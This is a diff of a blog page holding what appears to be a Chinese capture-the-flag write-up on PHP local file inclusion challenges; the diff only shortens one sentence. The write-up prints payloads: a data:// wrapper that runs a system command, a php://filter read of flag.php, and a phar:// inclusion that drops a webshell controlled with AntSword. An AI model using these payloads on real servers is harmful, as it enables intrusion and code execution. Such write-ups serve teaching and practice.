@@ -99,7 +99,7 @@ document.addEventListener("pjax:complete", reset);reset()})</script><meta name="
 <h6 id="③"><a href="#③" class="headerlink" title="③"></a>③</h6><p>input寄了，于是采用<code>?file=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;</code></p>
 <p>访问出现的flag_xxx得到flag</p>
 <h6 id="④"><a href="#④" class="headerlink" title="④"></a>④</h6><p>data也寄了，于是用<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>找flag</p>
-<p>获得如下的base64编码的flag：</p>
+<p>获得base64编码的flag</p>
 <h6 id="⑤"><a href="#⑤" class="headerlink" title="⑤"></a>⑤</h6><p>根据源码提示，用burpsuite抓包写入I want flag，出现flag</p>
 <h6 id="⑥"><a href="#⑥" class="headerlink" title="⑥"></a>⑥</h6><p>提示了上传和’zip’，并且发现phpinfo页面的url没有.php后缀，随后确认代码会自动’帮‘我们加.php</p>
 <p>利用phar函数，提交<code>…………recruit.yulinsec.cn/index.php/?file=phar://./uploads/这是一串名字.zip/hak</code>在index里把马提出来，链接蚁剑找到flag</p>
